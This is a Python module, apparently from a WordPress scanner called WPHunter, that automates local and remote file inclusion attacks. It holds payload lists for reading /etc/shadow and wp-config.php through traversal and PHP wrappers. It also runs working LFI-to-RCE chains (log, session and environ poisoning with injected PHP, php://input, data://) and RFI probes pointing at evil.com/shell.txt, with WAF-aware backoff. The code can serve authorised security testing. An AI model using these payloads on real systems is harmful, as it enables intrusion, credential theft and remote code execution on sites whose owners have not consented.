"""
WPHunter - Advanced LFI/RFI Scanner
====================================
Comprehensive Local/Remote File Inclusion detection with RCE chains.

Features:
- 100+ LFI payloads (PHP wrappers, traversal variations, null bytes)
- RFI (Remote File Inclusion) testing
- LFI-to-RCE attack chains:
  * Log poisoning
  * Session poisoning
  * php://input wrapper
  * data:// wrapper
  * /proc/self/environ poisoning
- Robust validation to eliminate false positives
- Smart rate limiting with WAF detection

CWE-98: Improper Control of Filename for Include/Require
"""

import asyncio
import base64
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlparse

from bs4 import BeautifulSoup

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class LFIFinding:
    """LFI/RFI vulnerability finding."""
    url: str
    parameter: str
    payload: str
    evidence: str
    plugin: Optional[str] = None
    severity: str = "high"
    cwe: str = "CWE-98"
    finding_type: str = "LFI"  # LFI, RFI, or RCE
    
    def to_dict(self) -> Dict:
        return {
            "type": self.finding_type,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence[:300],
            "plugin": self.plugin,
            "severity": self.severity,
            "cwe": self.cwe
        }


class LFIPayloads:
    """Comprehensive LFI payload collection."""
    
    # Linux system files
    LINUX_TARGETS = [
        ("/etc/passwd", "root:"),
        ("/etc/shadow", "root:"),
        ("/etc/hosts", "localhost"),
        ("/etc/issue", "Linux"),
        ("/etc/group", "root:"),
        ("/proc/self/environ", "PATH="),
        ("/proc/version", "Linux"),
        ("/proc/cmdline", "root="),
        ("/proc/self/cmdline", ""),
    ]
    
    # WordPress specific files
    WP_TARGETS = [
        ("wp-config.php", "DB_NAME"),
        ("../wp-config.php", "DB_NAME"),
        ("../../wp-config.php", "DB_NAME"),
        ("../../../wp-config.php", "DB_NAME"),
        (".htaccess", "RewriteEngine"),
        ("wp-settings.php", "ABSPATH"),
        ("wp-load.php", "ABSPATH"),
        ("../wp-includes/version.php", "$wp_version"),
    ]
    
    # PHP wrappers (CRITICAL for bypasses and RCE)
    PHP_WRAPPERS = [
        ("php://filter/convert.base64-encode/resource=", "PD9waHA"),
        ("php://filter/read=convert.base64-encode/resource=", "PD9waHA"),
        ("php://filter/read=string.rot13/resource=", "<?cuc"),
        ("php://filter/zlib.deflate/resource=", ""),
        ("php://input", ""),  # RCE potential
        ("data://text/plain,<?php system('id'); ?>", "uid="),
        ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "uid="),
    ]
    
    # Path traversal variations
    TRAVERSAL_TECHNIQUES = [
        "../",           # Basic
        "..%2f",         # URL encoded
        "..%252f",       # Double URL encoded
        "..%c0%af",      # UTF-8 overlong
        "....//",        # Doubled
        r"....\/",       # Mixed slashes
        "..\\",          # Windows
        "..%5c",         # URL encoded backslash
        "..//..//",      # Double slash
        "..;/",          # Semicolon bypass
    ]
    
    # Null byte tricks (PHP < 5.3)
    NULL_BYTES = ["%00", "%2500", "%00.jpg", "%00.php"]
    
    # Log files for log poisoning
    LOG_FILES = [
        ("/var/log/apache2/access.log", "GET"),
        ("/var/log/apache2/error.log", "PHP"),
        ("/var/log/nginx/access.log", "GET"),
        ("/var/log/nginx/error.log", "[error]"),
        ("/var/log/httpd/access_log", "GET"),
        ("/wp-content/debug.log", "PHP"),
        ("../wp-content/debug.log", "PHP"),
    ]
    
    @classmethod
    def generate(cls, depth: int = 5) -> List[Tuple[str, str]]:
        """Generate all LFI payloads."""
        payloads = []
        
        # Generate traversal prefixes
        traversals = []
        for technique in cls.TRAVERSAL_TECHNIQUES[:5]:  # Limit to avoid explosion
            for d in range(1, depth + 1):
                traversals.append(technique * d)
        
        # Combine with targets
        for target, signature in cls.LINUX_TARGETS + cls.WP_TARGETS:
            payloads.append((target, signature))
            
            # With traversals
            for trav in traversals[:8]:
                payloads.append((trav + target, signature))
                
                # With null bytes (for old PHP)
                for null in cls.NULL_BYTES[:2]:
                    payloads.append((trav + target + null, signature))
        
        # Add wrappers
        for wrapper_prefix, signature in cls.PHP_WRAPPERS:
            payloads.append((wrapper_prefix + "wp-config.php", signature or "DB_NAME"))
            payloads.append((wrapper_prefix + "../wp-config.php", signature or "DB_NAME"))
            payloads.append((wrapper_prefix + "/etc/passwd", signature or "root:"))
        
        # Add log files
        payloads.extend(cls.LOG_FILES)
        
        return payloads


class SmartRateLimiter:
    """Intelligent rate limiter with WAF detection."""
    
    def __init__(self, initial_delay: float = 0.5):
        self.delay = initial_delay
        self.request_count = 0
        self.blocked_count = 0
        self.last_request_time = 0
        
    async def wait(self):
        """Wait with adaptive delay."""
        now = time.time()
        elapsed = now - self.last_request_time
        
        if elapsed < self.delay:
            await asyncio.sleep(self.delay - elapsed)
        
        # Exponential backoff if blocked
        if self.blocked_count > 0:
            backoff = min(30, 2 ** self.blocked_count * self.delay)
            await asyncio.sleep(backoff)
        
        self.last_request_time = time.time()
        self.request_count += 1
    
    def on_blocked(self):
        self.blocked_count += 1
        self.delay = min(5.0, self.delay * 2)
        logger.warning(f"WAF detected, increasing delay to {self.delay}s")
    
    def on_success(self):
        if self.blocked_count > 0:
            self.blocked_count = max(0, self.blocked_count - 1)


class LFIScanner:

    # ✅ FIX FP #7, #17: Whitelist legitimate WordPress files
    LEGITIMATE_WP_FILES = [
        'robots.txt', 'sitemap.xml', 'wp-config-sample.php',
        'readme.html', 'license.txt', 'wp-includes/version.php',
        'wp-admin/about.php', 'wp-content/index.php',
    ]
    
    def _is_legitimate_file(self, path: str) -> bool:
        """Check if file is a legitimate WordPress file."""
        path_lower = path.lower()
        return any(legit in path_lower for legit in self.LEGITIMATE_WP_FILES)
    """
    Advanced LFI/RFI scanner with RCE chain testing.
    
    Tests for:
    - Local File Inclusion (LFI)
    - Remote File Inclusion (RFI)
    - LFI-to-RCE chains (log/session/environ poisoning)
    """
    
    SUSPICIOUS_PARAMS = [
        "file", "path", "page", "include", "inc", "template", "tpl",
        "doc", "document", "folder", "root", "pg", "style", "pdf",
        "lang", "language", "view", "content", "layout", "mod",
        "conf", "config", "plugin", "module", "theme", "dir",
        "load", "read", "data", "source", "src", "url", "uri",
        "query", "call", "action", "name", "filename", "download"
    ]
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[LFIFinding] = []
        self.discovered_endpoints: Set[str] = set()
        self.rate_limiter = SmartRateLimiter(initial_delay=0.5)
        self.payloads = LFIPayloads.generate(depth=5)
        
    async def scan(
        self,
        plugins: List[str] = None,
        urls: List[str] = None,
        test_rce_chains: bool = True
    ) -> List[LFIFinding]:
        """
        Run comprehensive LFI/RFI scan.
        
        Args:
            plugins: List of plugin slugs to scan
            urls: List of URLs to test
            test_rce_chains: Test LFI-to-RCE attack chains
        """
        logger.section("LFI/RFI Scanner")
        
        # Discover endpoints
        if plugins:
            await self._discover_plugin_endpoints(plugins)
        
        if urls:
            for url in urls:
                self.discovered_endpoints.add(url)
        
        # Test each endpoint
        for endpoint in list(self.discovered_endpoints)[:50]:  # Limit
            params = self._extract_parameters(endpoint)
            
            for param in params:
                # Basic LFI testing
                await self._test_lfi(endpoint, param)
                
                # RFI testing
                await self._test_rfi(endpoint, param)
                
                # LFI-to-RCE chains (if LFI found)
                if test_rce_chains:
                    lfi_found = any(
                        f.parameter == param and f.url in endpoint
                        for f in self.findings
                    )
                    if lfi_found:
                        await self._test_lfi_to_rce_chains(endpoint, param)
        
        logger.success(f"LFI scan complete: {len(self.findings)} findings")
        return self.findings
    
    async def _test_lfi(self, endpoint: str, param: str):
        """Test parameter for LFI vulnerability."""
        base_url = endpoint.split('?')[0]
        
        # Test limited payloads to avoid ban
        for payload, signature in self.payloads[:15]:
            await self.rate_limiter.wait()
            
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                response = await self.http.get(test_url, timeout=10)
                
                # Check for WAF block
                if response.status_code in [403, 429]:
                    self.rate_limiter.on_blocked()
                    return
                
                if any(waf in response.text.lower() for waf in ['cloudflare', 'blocked', 'access denied']):
                    self.rate_limiter.on_blocked()
                    return
                
                self.rate_limiter.on_success()
                
                # Check for vulnerability
                if response.ok and signature and signature in response.text:
                    if self._validate_finding(response.text, signature, payload):
                        finding = LFIFinding(
                            url=base_url,
                            parameter=param,
                            payload=payload,
                            evidence=self._extract_evidence(response.text, signature),
                            severity="critical" if "wp-config" in payload else "high",
                            finding_type="LFI"
                        )
                        self.findings.append(finding)
                        logger.vuln("critical", f"LFI in {param}: {payload[:40]}...")
                        return  # Stop after first finding
                        
            except Exception as e:
                logger.debug(f"LFI test failed: {e}")
                continue
    
    async def _test_rfi(self, endpoint: str, param: str):
        """Test for Remote File Inclusion."""
        base_url = endpoint.split('?')[0]
        
        rfi_payloads = [
            # Use your own server in real tests
            ("http://evil.com/shell.txt", "<?php"),
            ("//evil.com/shell.txt", "<?php"),
            ("data://text/plain,<?php system('id'); ?>", "uid="),
        ]
        
        for payload, signature in rfi_payloads:
            await self.rate_limiter.wait()
            
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                response = await self.http.get(test_url, timeout=5)
                
                if response.ok:
                    # Check for RFI indicators
                    indicators = [
                        "allow_url_include",
                        "failed to open stream",
                        "http:// wrapper is disabled",
                        signature
                    ]
                    
                    for indicator in indicators:
                        if indicator and indicator in response.text:
                            finding = LFIFinding(
                                url=base_url,
                                parameter=param,
                                payload=payload,
                                evidence=response.text[:500],
                                severity="critical",
                                finding_type="RFI"
                            )
                            self.findings.append(finding)
                            logger.vuln("critical", f"RFI in {param}!")
                            return
            except Exception:
                continue
    
    async def _test_lfi_to_rce_chains(self, endpoint: str, param: str):
        """Test complete LFI-to-RCE attack chains."""
        logger.info(f"Testing LFI-to-RCE chains for {param}...")
        
        # Chain 1: Log poisoning
        if await self._test_log_poisoning(endpoint, param):
            return
        
        # Chain 2: Session poisoning
        if await self._test_session_poisoning(endpoint, param):
            return
        
        # Chain 3: php://input
        if await self._test_php_input(endpoint, param):
            return
        
        # Chain 4: data:// wrapper
        if await self._test_data_wrapper(endpoint, param):
            return
        
        # Chain 5: /proc/self/environ
        if await self._test_environ_poisoning(endpoint, param):
            return
    
    async def _test_log_poisoning(self, endpoint: str, param: str) -> bool:
        """Test log poisoning for RCE."""
        malicious_ua = "<?php system('id'); ?>"
        
        try:
            # Poison logs
            await self.http.get("/", headers={"User-Agent": malicious_ua})
            
            # Try to include log files
            log_paths = [
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "../../../var/log/apache2/access.log",
            ]
            
            base_url = endpoint.split('?')[0]
            
            for log_path in log_paths:
                await self.rate_limiter.wait()
                test_url = f"{base_url}?{param}={log_path}"
                
                response = await self.http.get(test_url)
                
                if response.ok and "uid=" in response.text:
                    finding = LFIFinding(
                        url=base_url,
                        parameter=param,
                        payload=f"Log poisoning: {log_path}",
                        evidence="RCE confirmed - uid= output",
                        severity="critical",
                        finding_type="RCE"
                    )
                    self.findings.append(finding)
                    logger.vuln("critical", f"RCE via log poisoning in {param}!")
                    return True
        except Exception:
            pass
        return False
    
    async def _test_session_poisoning(self, endpoint: str, param: str) -> bool:
        """Test session file inclusion for RCE."""
        try:
            # Create session with malicious data
            response = await self.http.post(
                "/",
                data={"search": "<?php system('id'); ?>"}
            )
            
            # Extract session ID
            session_id = None
            for cookie in response.cookies:
                if "sess" in cookie.name.lower() or "phpsessid" in cookie.name.lower():
                    session_id = cookie.value
                    break
            
            if not session_id:
                return False
            
            # Try to include session file
            session_paths = [
                f"/var/lib/php/sessions/sess_{session_id}",
                f"/tmp/sess_{session_id}",
            ]
            
            base_url = endpoint.split('?')[0]
            
            for sess_path in session_paths:
                await self.rate_limiter.wait()
                test_url = f"{base_url}?{param}={sess_path}"
                
                response = await self.http.get(test_url)
                
                if response.ok and "uid=" in response.text:
                    finding = LFIFinding(
                        url=base_url,
                        parameter=param,
                        payload=f"Session: {sess_path}",
                        evidence="RCE via session poisoning",
                        severity="critical",
                        finding_type="RCE"
                    )
                    self.findings.append(finding)
                    logger.vuln("critical", f"RCE via session poisoning in {param}!")
                    return True
        except Exception:
            pass
        return False
    
    async def _test_php_input(self, endpoint: str, param: str) -> bool:
        """Test php://input wrapper for RCE."""
        base_url = endpoint.split('?')[0]
        test_url = f"{base_url}?{param}=php://input"
        
        php_payload = "<?php system('id'); ?>"
        
        try:
            await self.rate_limiter.wait()
            response = await self.http.post(test_url, data=php_payload)
            
            if response.ok and "uid=" in response.text:
                finding = LFIFinding(
                    url=base_url,
                    parameter=param,
                    payload="php://input",
                    evidence="RCE via php://input",
                    severity="critical",
                    finding_type="RCE"
                )
                self.findings.append(finding)
                logger.vuln("critical", f"RCE via php://input in {param}!")
                return True
        except Exception:
            pass
        return False
    
    async def _test_data_wrapper(self, endpoint: str, param: str) -> bool:
        """Test data:// wrapper for RCE."""
        base_url = endpoint.split('?')[0]
        
        b64_payload = base64.b64encode(b"<?php system('id'); ?>").decode()
        
        payloads = [
            f"data://text/plain,<?php system('id'); ?>",
            f"data://text/plain;base64,{b64_payload}",
        ]
        
        for payload in payloads:
            await self.rate_limiter.wait()
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                response = await self.http.get(test_url)
                if response.ok and "uid=" in response.text:
                    finding = LFIFinding(
                        url=base_url,
                        parameter=param,
                        payload="data:// wrapper",
                        evidence="RCE via data:// wrapper",
                        severity="critical",
                        finding_type="RCE"
                    )
                    self.findings.append(finding)
                    logger.vuln("critical", f"RCE via data:// in {param}!")
                    return True
            except Exception:
                pass
        return False
    
    async def _test_environ_poisoning(self, endpoint: str, param: str) -> bool:
        """Test /proc/self/environ poisoning."""
        malicious_ua = "<?php system('id'); ?>"
        await self.http.get("/", headers={"User-Agent": malicious_ua})
        
        base_url = endpoint.split('?')[0]
        environ_paths = [
            "/proc/self/environ",
            "../../../../../../proc/self/environ",
        ]
        
        for environ_path in environ_paths:
            await self.rate_limiter.wait()
            test_url = f"{base_url}?{param}={environ_path}"
            
            try:
                response = await self.http.get(test_url)
                if response.ok and "uid=" in response.text:
                    finding = LFIFinding(
                        url=base_url,
                        parameter=param,
                        payload="/proc/self/environ",
                        evidence="RCE via environ poisoning",
                        severity="critical",
                        finding_type="RCE"
                    )
                    self.findings.append(finding)
                    logger.vuln("critical", f"RCE via /proc/self/environ in {param}!")
                    return True
            except Exception:
                pass
        return False
    
    def _validate_finding(self, content: str, signature: str, payload: str) -> bool:
        """Robust validation to eliminate false positives."""
        text_only = re.sub(r'<[^>]+>', '', content)
        
        # /etc/passwd validation
        if signature == "root:":
            if not re.search(r'root:.*?:0:0:', text_only):
                return False
            user_lines = re.findall(r'\w+:x?:\d+:\d+:', text_only)
            if len(user_lines) < 3:
                return False
            false_positives = ["example.com", "tutorial", "demo"]
            if any(fp in content.lower() for fp in false_positives):
                return False
            return True
        
        # wp-config.php validation
        elif signature == "DB_NAME":
            if "define(" not in content and "define (" not in content:
                return False
            db_constants = ["DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST"]
            found = sum(1 for const in db_constants if const in content)
            if found < 3:
                return False
            wp_indicators = ["ABSPATH", "wp-settings.php", "table_prefix"]
            if not any(ind in content for ind in wp_indicators):
                return False
            return True
        
        # Base64 validation
        elif signature == "PD9waHA":
            try:
                decoded = base64.b64decode(content[:1000])
                return b"<?php" in decoded or b"define(" in decoded
            except Exception:
                return False
        
        # /etc/hosts validation
        elif signature == "localhost":
            if not re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', content):
                return False
            if not re.search(r'127\.0\.0\.1.*localhost', content):
                return False
            return True
        
        return True
    
    def _extract_evidence(self, content: str, signature: str) -> str:
        """Extract relevant evidence from response."""
        lines = content.split('\n')
        for i, line in enumerate(lines):
            if signature in line:
                start = max(0, i - 2)
                end = min(len(lines), i + 3)
                return '\n'.join(lines[start:end])
        return content[:500]
    
    def _extract_parameters(self, url: str) -> Set[str]:
        """Extract GET parameters from URL."""
        params = set()
        parsed = urlparse(url)
        if parsed.query:
            params.update(parse_qs(parsed.query).keys())
        return params
    
    async def _discover_plugin_endpoints(self, plugins: List[str]):
        """Discover PHP endpoints in plugins."""
        for plugin in plugins[:10]:  # Limit
            plugin_path = f"/wp-content/plugins/{plugin}/"
            
            try:
                response = await self.http.get(plugin_path)
                if response.ok:
                    # Extract PHP file links
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        if href.endswith('.php') and '?' in href:
                            self.discovered_endpoints.add(plugin_path + href)
            except Exception:
                continue
    
    def get_summary(self) -> Dict:
        """Get scan summary."""
        return {
            "total_findings": len(self.findings),
            "lfi_count": len([f for f in self.findings if f.finding_type == "LFI"]),
            "rfi_count": len([f for f in self.findings if f.finding_type == "RFI"]),
            "rce_count": len([f for f in self.findings if f.finding_type == "RCE"]),
            "findings": [f.to_dict() for f in self.findings]
        }
